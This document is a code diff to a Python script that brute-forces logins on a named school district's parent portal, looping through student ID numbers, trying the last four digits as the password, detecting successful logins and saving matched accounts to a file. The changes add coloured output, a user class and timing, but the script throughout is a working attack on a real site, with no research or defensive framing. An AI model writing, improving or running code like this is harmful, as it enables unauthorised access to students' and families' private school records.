@@ -1,5 +1,7 @@
+from colored import fg, bg, attr
 import mechanize
 from bs4 import BeautifulSoup
+import time
 
 br = mechanize.Browser()
 br.set_handle_equiv(True)
@@ -7,11 +9,27 @@ br.set_handle_redirect(True)
 br.set_handle_referer(True)
 br.set_handle_robots(False)
 
-# Set defaults
-br.addheaders = [
-    ("User-agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
+# Set colors
+green = fg('#00FF00')
+orange = fg('#FFFF00')
+res = attr('reset')
 
 
+# Set user class
+class user:
+    firstname = "N/A"
+    lastname = "N/A"
+    studentid = "N/A"
+    username = "N/A"
+    password = "N/A"
+    birthmonth = "N/A"
+
+
+# Declare user class
+user = user()
+
+
+# Declare custom strip function
 def downwithit(string, firstHalf, secondHalf):
     string = str(string)
     format1 = string.replace(str(firstHalf), "")
@@ -19,23 +37,26 @@ def downwithit(string, firstHalf, secondHalf):
     return format2
 
 
-for x in range(4620000000, 4699999999):
+# Main function
+for x in range(4624021140, 4699999999):
     br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
     br.select_form(nr=0)
-    username = str(x)
-    userpass = username[6] + username[7] + username[8] + username[9]
+    user.studentid = str(x)
+    userpass = user.studentid[6] + user.studentid[7] + \
+        user.studentid[8] + user.studentid[9]
+
     # Set bruteforce combo
-    br.form['wrkuser'] = username
-    br.form['wrkpasswd'] = userpass
-    print("Checking " + br.form['wrkuser'] + " " + br.form['wrkpasswd'])
+    br.form['wrkuser'] = user.studentid
+    br.form['wrkpasswd'] = user.studentid[-4:]
+    print("[RUN] Checking %s..." % user.studentid)
     response = br.submit()
     try:
         # Try to select form, if missing then combo was found
         br.select_form(nr=0)
     except mechanize._mechanize.FormNotFoundError:
+        start = time.time()
         # Notify there was a match
-        print("=== MATCH === \nUsername: " + username
-              + "\nPassword: " + userpass + "\n=== ===== ===")
+        print("[RUN] " + green + "Found " + user.studentid + "..." + res)
 
         # Retrieve redirect url embedded in js code
         firstFormat = BeautifulSoup(br.response().read(), 'lxml')
@@ -57,10 +78,13 @@ for x in range(4620000000, 4699999999):
 
         # Write to file
         f = open("./assets/matches.txt", "a")
-        f.write("Combo: " + str(userCombo) + "\nUsername: "
-                + username + "\nPassword: " + userpass + "\n\n")
+        f.write("Combo: " + str(userCombo) + "\nStudentID: "
+                + user.studentid + "\n\n")
         f.close()
 
-        # Reset web browser to counteract a FormNotFoundError
-        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
+        # Debug process time
+        end = time.time()
+        delta = end - start
+        print("[DEBUG] " + orange
+              + "Took " + str(round(delta, 2)) + "s to process match..." + res)
         pass
